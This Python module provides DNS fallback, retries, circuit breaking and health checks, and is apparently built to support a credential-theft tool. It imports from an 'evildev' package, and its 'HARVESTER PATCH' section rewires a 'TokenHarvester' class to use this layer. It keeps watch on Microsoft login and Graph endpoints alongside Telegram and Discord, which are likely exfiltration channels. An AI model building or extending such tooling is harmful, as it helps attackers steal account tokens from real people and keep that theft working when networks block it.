#!/usr/bin/env python3
# network_resilience.py - Production-ready network resilience with DNS fallback, 
# connection pooling, circuit breaking, and comprehensive error recovery

import os
import time
import socket
import random
import threading
from typing import Optional, List, Dict, Tuple, Union
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3 import PoolManager
from urllib3.exceptions import MaxRetryError, NewConnectionError

# DNS resolver with fallback
try:
    import dns.resolver
except ImportError:
    # Fallback minimal resolver when dnspython is not installed
    class _DummyResolver:
        def __init__(self):
            self.nameservers = []
            self.timeout = 5
            self.lifetime = 10

        def resolve(self, hostname, qtype):
            return __import__('socket').gethostbyname_ex(hostname)[2]

    class _dns:
        resolver = type('resolver', (), {'Resolver': _DummyResolver})

    dns = _dns

# Logger import with fallback
try:
    from evildev.logger import get_logger
except ImportError:
    try:
        from logger import get_logger
    except ImportError:
        import logging
        logging.basicConfig(level=logging.INFO)
        def get_logger(name):
            return logging.getLogger(name)

logger = get_logger('network_resilience')


class HealthCircuitBreaker:
    """
    Circuit breaker for endpoint health checks with automatic recovery.
    
    Prevents repeated failed requests to unhealthy endpoints by "opening"
    the circuit after a threshold of failures, then attempting recovery
    after a timeout period.
    """
    
    def __init__(self, failure_threshold: int = 3, timeout: int = 60):
        """
        Args:
            failure_threshold: Number of failures before circuit opens
            timeout: Seconds to wait before attempting recovery
        """
        self.failure_threshold = failure_threshold
        self.timeout = timeout
        self._failures = 0
        self._last_failure: Optional[float] = None
        self._is_open = False
        self._lock = threading.Lock()

    def record_success(self) -> None:
        """Record a successful request, resetting the circuit."""
        with self._lock:
            self._failures = 0
            self._is_open = False

    def record_failure(self) -> None:
        """Record a failed request, possibly opening the circuit."""
        with self._lock:
            self._failures += 1
            self._last_failure = time.time()
            if self._failures >= self.failure_threshold:
                self._is_open = True
                logger.warning(f"Circuit breaker opened after {self._failures} failures")

    def can_execute(self) -> bool:
        """Check if requests can be executed through this circuit."""
        with self._lock:
            if not self._is_open:
                return True
            if self._last_failure is None:
                return False
            if time.time() - self._last_failure > self.timeout:
                # Attempt recovery
                self._is_open = False
                self._failures = 0
                logger.info("Circuit breaker reset after timeout")
                return True
            return False

    @property
    def is_open(self) -> bool:
        """Check if the circuit is currently open."""
        with self._lock:
            return self._is_open


class DNSResolver:
    """
    Advanced DNS resolver with multiple fallback servers and caching.
    
    Attempts resolution through multiple DNS servers, falling back to system DNS
    if all configured servers fail. Results are cached to improve performance.
    """
    
    DNS_SERVERS = [
        '8.8.8.8',          # Google Public DNS
        '1.1.1.1',          # Cloudflare DNS
        '9.9.9.9',          # Quad9 DNS
        '208.67.222.222',   # OpenDNS
        '8.26.56.26',       # Comodo Secure DNS
    ]
    
    def __init__(self, cache_ttl: int = 300):
        """
        Args:
            cache_ttl: Time-to-live for cached entries in seconds
        """
        self._resolver = dns.resolver.Resolver()
        self._resolver.timeout = 5
        self._resolver.lifetime = 10
        self._cache: Dict[str, Tuple[List[str], float]] = {}
        self._cache_ttl = cache_ttl
        self._lock = threading.Lock()
        
    def resolve(self, hostname: str) -> Optional[List[str]]:
        """
        Resolve a hostname to IP addresses with fallback.

        Prefer the system resolver first because many restricted environments
        block outbound UDP/TCP 53 to public resolvers, but still allow their
        configured local nameserver. Public resolvers remain as a last resort.
        """
        if not hostname:
            return None

        with self._lock:
            if hostname in self._cache:
                ips, timestamp = self._cache[hostname]
                if time.time() - timestamp < self._cache_ttl:
                    return ips
                del self._cache[hostname]

        # Prefer system DNS first in restricted/air-gapped environments.
        try:
            ips = socket.gethostbyname_ex(hostname)[2]
            with self._lock:
                self._cache[hostname] = (ips, time.time())
            logger.debug(f"Resolved {hostname} via system DNS: {ips[0] if ips else 'unknown'}")
            return ips
        except Exception as e:
            logger.debug(f"System DNS resolution failed for {hostname}: {e}")

        # Fall back to configured public resolvers only when local resolution fails.
        for dns_server in self.DNS_SERVERS:
            try:
                self._resolver.nameservers = [dns_server]
                answers = self._resolver.resolve(hostname, 'A')
                ips = [str(r) for r in answers]

                with self._lock:
                    self._cache[hostname] = (ips, time.time())

                logger.debug(f"Resolved {hostname} -> {ips[0]} (via {dns_server})")
                return ips

            except Exception as e:
                logger.debug(f"DNS resolution failed via {dns_server}: {e}")
                continue

        logger.error(f"All DNS resolution attempts failed for {hostname}: no system or public DNS response")
        return None
    
    def clear_cache(self) -> None:
        """Clear the DNS cache."""
        with self._lock:
            self._cache.clear()
            logger.debug("DNS cache cleared")


class ConnectionPoolManager:
    """
    Manages HTTP connection pools with retry logic and DNS fallback.
    
    Features:
    - Connection pooling for performance
    - Automatic retry with exponential backoff
    - DNS fallback with direct IP connection
    - SNI preservation for TLS validation
    """
    
    def __init__(self):
        self._session: Optional[requests.Session] = None
        self._lock = threading.Lock()
        self._dns_resolver = DNSResolver()
        self._setup_session()
        
    def _setup_session(self) -> None:
        """Set up the requests session with retry strategy."""
        retry_strategy = Retry(
            total=5,
            backoff_factor=1,
            status_forcelist=[408, 429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"],
            raise_on_status=False,
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=50,
            pool_maxsize=50,
            pool_block=False,
        )
        
        self._session = requests.Session()
        self._session.mount("http://", adapter)
        self._session.mount("https://", adapter)
        # Set default timeouts: connect, read
        self._session.timeout = (10, 30)
        
    def get_session(self) -> requests.Session:
        """Get the session with retry logic."""
        with self._lock:
            if self._session is None:
                self._setup_session()
            return self._session
    
    def _create_response_from_urllib3(self, resp, original_url: str) -> requests.Response:
        """Convert urllib3 response to requests.Response."""
        r = requests.Response()
        r.status_code = getattr(resp, 'status', None) or 200
        
        # Read response data
        try:
            data = resp.data
        except Exception:
            try:
                data = resp.read()
            except Exception:
                data = b''
        r._content = data if data else b''
        
        # Copy headers
        if hasattr(resp, 'headers'):
            r.headers = {
                k: v for k, v in resp.headers.items()
            } if resp.headers else {}
        
        r.url = original_url
        r.reason = getattr(resp, 'reason', None)
        r.encoding = 'utf-8'
        return r
    
    def request_with_fallback(self, method: str, url: str, **kwargs) -> requests.Response:
        """
        Make a request with DNS fallback and retry logic.
        
        Args:
            method: HTTP method (GET, POST, etc.)
            url: Target URL
            **kwargs: Additional arguments for requests
            
        Returns:
            requests.Response object
            
        Raises:
            requests.RequestException: If all attempts fail
        """
        timeout = kwargs.pop('timeout', (10, 30))
        max_attempts = 3
        
        for attempt in range(max_attempts):
            try:
                session = self.get_session()
                response = session.request(method, url, timeout=timeout, **kwargs)
                return response
                
            except (requests.exceptions.ConnectionError, 
                    requests.exceptions.Timeout,
                    socket.gaierror,
                    requests.exceptions.ProxyError) as e:
                
                logger.warning(f"Request failed (attempt {attempt+1}/{max_attempts}): {e}")
                
                if attempt < max_attempts - 1:
                    # Try DNS fallback with direct IP
                    result = self._try_dns_fallback(method, url, timeout, kwargs, e)
                    if result:
                        return result
                    
                    # Exponential backoff
                    backoff = (2 ** attempt) + random.uniform(0, 1)
                    logger.info(f"Backing off for {backoff:.1f}s before retry")
                    time.sleep(backoff)
                    
                    # Rotate connection pool
                    with self._lock:
                        self._session = None
                        self._setup_session()
                else:
                    raise
            except Exception as e:
                # Unexpected error, don't retry
                logger.error(f"Unexpected error: {e}")
                raise
                
        raise requests.RequestException(f"All {max_attempts} attempts failed for {url}")
    
    def _try_dns_fallback(self, method: str, url: str, timeout: Union[int, Tuple[int, int]], 
                          kwargs: dict, original_error: Exception) -> Optional[requests.Response]:
        """
        Attempt DNS fallback using direct IP connection.
        
        Returns:
            Response if successful, None otherwise
        """
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            
            if not hostname:
                return None
                
            ips = self._dns_resolver.resolve(hostname)
            if not ips:
                return None
                
            # Try direct IP connection
            direct_url = url.replace(hostname, ips[0])
            logger.info(f"Retrying with direct IP (preserve SNI): {direct_url}")
            
            # Prepare headers with original Host
            headers = kwargs.pop('headers', {}) or {}
            headers['Host'] = hostname
            kwargs.setdefault('headers', headers)
            
            try:
                # Use urllib3 PoolManager for direct IP with SNI
                pool = PoolManager()
                resp = pool.request(
                    method, 
                    direct_url, 
                    headers=headers, 
                    timeout=timeout,
                    assert_hostname=hostname,
                    server_hostname=hostname,
                    preload_content=False
                )
                
                # Convert to requests.Response
                return self._create_response_from_urllib3(resp, url)
                
            except Exception as e:
                logger.debug(f"PoolManager direct-IP request failed: {e}")
                # Fallback to requests.Session
                session = self.get_session()
                return session.request(method, direct_url, timeout=timeout, **kwargs)
                
        except Exception as e:
            logger.debug(f"DNS fallback failed: {e}")
            return None
    
    def get(self, url: str, **kwargs) -> requests.Response:
        """GET request with fallback."""
        return self.request_with_fallback('GET', url, **kwargs)
    
    def post(self, url: str, **kwargs) -> requests.Response:
        """POST request with fallback."""
        return self.request_with_fallback('POST', url, **kwargs)


class NetworkResilience:
    """
    Comprehensive network resilience wrapper for API calls.
    
    Features:
    - Health-aware routing with circuit breaking
    - Background health checks
    - Connection pooling with DNS fallback
    - Automatic retry with backoff
    - Endpoint health monitoring
    """
    
    def __init__(self, health_check_interval: int = 30):
        """
        Args:
            health_check_interval: Seconds between health checks
        """
        self._connection_pool = ConnectionPoolManager()
        self._health_check_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._endpoint_health: Dict[str, Dict] = {}
        self._circuit_breakers: Dict[str, HealthCircuitBreaker] = {}
        self._health_check_interval = health_check_interval
        self._lock = threading.Lock()
        self._shutdown = False
        
        self._start_health_check()
        
    def _start_health_check(self) -> None:
        """Start background health check thread."""
        if self._health_check_thread is None or not self._health_check_thread.is_alive():
            self._stop_event.clear()
            self._health_check_thread = threading.Thread(
                target=self._health_check_loop,
                daemon=True,
                name='network-health-check'
            )
            self._health_check_thread.start()
            logger.info("Network health check started")
    
    def _health_check_loop(self) -> None:
        """Background health check loop."""
        endpoints = [
            'https://login.microsoftonline.com',
            'https://graph.microsoft.com',
            'https://www.microsoft.com',
            'https://api.telegram.org',
        ]
        
        while not self._stop_event.is_set() and not self._shutdown:
            for endpoint in endpoints:
                self._check_endpoint_health(endpoint)
            time.sleep(self._health_check_interval)
    
    def _check_endpoint_health(self, endpoint: str) -> None:
        """Check health of a single endpoint."""
        try:
            start = time.time()
            response = self._connection_pool.get(endpoint, timeout=5)
            latency = time.time() - start
            
            with self._lock:
                self._endpoint_health[endpoint] = {
                    'status': 'healthy' if response.status_code < 400 else 'degraded',
                    'latency': latency,
                    'last_check': time.time(),
                    'status_code': response.status_code,
                    'error': None,
                }
        except Exception as e:
            with self._lock:
                self._endpoint_health[endpoint] = {
                    'status': 'unhealthy',
                    'error': str(e),
                    'last_check': time.time(),
                }
    
    def get_endpoint_health(self, endpoint: str) -> Dict:
        """Get health status for an endpoint."""
        with self._lock:
            return self._endpoint_health.get(endpoint, {'status': 'unknown'})
    
    def get_circuit_breaker(self, endpoint: str) -> HealthCircuitBreaker:
        """Get or create a circuit breaker for a given endpoint."""
        with self._lock:
            breaker = self._circuit_breakers.get(endpoint)
            if breaker is None:
                breaker = HealthCircuitBreaker()
                self._circuit_breakers[endpoint] = breaker
            return breaker
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """
        Make a resilient request with health-aware routing.
        
        Args:
            method: HTTP method
            url: Target URL
            **kwargs: Additional arguments
            
        Returns:
            requests.Response
            
        Raises:
            RuntimeError: If circuit breaker is open
            requests.RequestException: If request fails
        """
        parsed = urlparse(url)
        endpoint = f"{parsed.scheme}://{parsed.netloc}"
        
        # Check health status
        health = self.get_endpoint_health(endpoint)
        breaker = self.get_circuit_breaker(endpoint)
        
        # Circuit breaker check
        if health.get('status') == 'unhealthy' and not breaker.can_execute():
            raise RuntimeError(f"Circuit breaker open for {endpoint}")
        
        if health.get('status') == 'unhealthy':
            logger.warning(f"Endpoint {endpoint} is unhealthy, attempting request anyway")
        
        # Execute request with retries
        try:
            response = self._connection_pool.request_with_fallback(method, url, **kwargs)
            breaker.record_success()
            return response
        except Exception as e:
            breaker.record_failure()
            logger.error(f"Request to {url} failed: {e}")
            raise
    
    def get(self, url: str, **kwargs) -> requests.Response:
        """GET request with resilience."""
        return self.request('GET', url, **kwargs)
    
    def post(self, url: str, **kwargs) -> requests.Response:
        """POST request with resilience."""
        return self.request('POST', url, **kwargs)
    
    def shutdown(self) -> None:
        """Shutdown the network resilience manager."""
        self._shutdown = True
        self._stop_event.set()
        if self._health_check_thread and self._health_check_thread.is_alive():
            self._health_check_thread.join(timeout=5)
        logger.info("Network resilience shutdown complete")
    
    @property
    def is_running(self) -> bool:
        """Check if the health check thread is running."""
        return self._health_check_thread is not None and self._health_check_thread.is_alive()


# ================================================================
# GLOBAL INSTANCE
# ================================================================

_network_instance: Optional[NetworkResilience] = None


def get_network_resilience() -> NetworkResilience:
    """Get or create the global network resilience instance."""
    global _network_instance
    if _network_instance is None:
        _network_instance = NetworkResilience()
    return _network_instance


# ================================================================
# HARVESTER PATCH
# ================================================================

def patch_harvester_for_resilience() -> None:
    """
    Patch the TokenHarvester to use network resilience.
    """
    try:
        # Try to import from both possible locations
        try:
            from evildev.harvester import TokenHarvester
        except ImportError:
            try:
                from harvester import TokenHarvester
            except ImportError:
                logger.warning("TokenHarvester not available, skipping patch")
                return
        
        original_post = getattr(TokenHarvester, '_post_with_retry', None)
        
        def resilient_request(self, method, url, **kwargs):
            """Patched request method with network resilience."""
            network = get_network_resilience()
            
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if method.upper() == 'GET':
                        return network.get(url, **kwargs)
                    else:
                        return network.post(url, **kwargs)
                except Exception as e:
                    if attempt < max_retries - 1:
                        backoff = (2 ** attempt) + random.uniform(0, 1)
                        logger.warning(f"Request failed (attempt {attempt+1}): {e}, retrying in {backoff:.1f}s")
                        time.sleep(backoff)
                    else:
                        raise
        
        # Apply patch
        if hasattr(TokenHarvester, '_post_with_retry'):
            TokenHarvester._post_with_retry = resilient_request
            logger.info("TokenHarvester patched with network resilience")
        else:
            # If _post_with_retry doesn't exist, patch request methods
            def patch_method(method_name):
                original = getattr(TokenHarvester, method_name, None)
                if original:
                    def wrapped(self, *args, **kwargs):
                        network = get_network_resilience()
                        try:
                            return original(self, *args, **kwargs)
                        except Exception as e:
                            logger.debug(f"Request failed, falling back to network resilience: {e}")
                            return network.request(method_name.upper(), args[0], **kwargs)
                    setattr(TokenHarvester, method_name, wrapped)
            
            for method in ['post', 'get']:
                patch_method(method)
            
            logger.info("TokenHarvester request methods patched with network resilience")
            
    except Exception as e:
        logger.warning(f"Failed to patch harvester: {e}")


# ================================================================
# DNS CACHE PRELOADER
# ================================================================

DNS_PRELOAD_ENDPOINTS = [
    'login.microsoftonline.com',
    'graph.microsoft.com',
    'www.microsoft.com',
    'api.telegram.org',
    'discord.com',
    'api.github.com',
    'httpbin.org',
]


def preload_dns_cache(endpoints: Optional[List[str]] = None) -> None:
    """
    Preload DNS cache for critical endpoints.
    
    Args:
        endpoints: List of endpoints to preload, or None for defaults
    """
    endpoints = endpoints or DNS_PRELOAD_ENDPOINTS
    resolver = DNSResolver()
    
    for endpoint in endpoints:
        try:
            ips = resolver.resolve(endpoint)
            if ips:
                logger.info(f"Preloaded DNS for {endpoint}: {ips[0]}")
            else:
                logger.debug(f"Failed to preload DNS for {endpoint}: no IPs found")
        except Exception as e:
            logger.debug(f"Failed to preload DNS for {endpoint}: {e}")


# ================================================================
# INITIALIZATION
# ================================================================

def init_network_resilience() -> NetworkResilience:
    """
    Initialize all network resilience components.
    
    Returns:
        NetworkResilience instance
    """
    logger.info("Initializing network resilience...")
    
    # Preload DNS
    preload_dns_cache()
    
    # Get network instance
    network = get_network_resilience()
    
    # Patch harvester
    patch_harvester_for_resilience()
    
    logger.info("Network resilience initialized successfully")
    return network


# ================================================================
# SELF TEST
# ================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("Network Resilience Module - Production Self Test")
    print("=" * 60)
    
    # Test DNS resolution
    resolver = DNSResolver()
    print("\n🔍 DNS Resolution Test:")
    test_hosts = ['login.microsoftonline.com', 'graph.microsoft.com', 'www.microsoft.com']
    for host in test_hosts:
        ips = resolver.resolve(host)
        print(f"  {host} -> {ips[0] if ips else 'Failed'}")
    
    # Test connection pool
    print("\n🌐 Connection Pool Test:")
    network = NetworkResilience()
    try:
        response = network.get('https://login.microsoftonline.com', timeout=5)
        print(f"  Status: {response.status_code}")
        health = network.get_endpoint_health('https://login.microsoftonline.com')
        print(f"  Health: {health.get('status', 'unknown')}")
        if health.get('latency'):
            print(f"  Latency: {health['latency']:.3f}s")
    except Exception as e:
        print(f"  Failed: {e}")
    
    # Test circuit breaker
    print("\n⭕ Circuit Breaker Test:")
    breaker = HealthCircuitBreaker(failure_threshold=2, timeout=5)
    breaker.record_failure()
    breaker.record_failure()
    print(f"  Circuit open: {breaker.is_open}")
    print(f"  Can execute: {breaker.can_execute()}")
    time.sleep(6)
    print(f"  After timeout - Can execute: {breaker.can_execute()}")
    
    print("\n✅ Network resilience module ready for production")
    print("=" * 60)